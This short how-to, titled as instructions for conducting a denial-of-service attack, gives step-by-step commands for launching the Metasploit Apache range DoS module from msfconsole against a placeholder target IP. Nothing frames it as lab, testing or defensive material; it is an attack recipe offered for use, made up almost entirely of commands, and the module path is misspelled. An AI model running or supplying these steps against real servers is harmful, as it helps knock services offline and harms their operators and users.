# How to conduct a DoS attack
Use Metasploit Framework Console (msfconsole)

# Using msfconsole
- Open the terminal (Ctrl+Alt+T)
- Run ```msfconsole```
- Execute the following commands
```bash
use auxillary/dos/http/apache_range_dos
set RHOST {TARGET IP}
run
```
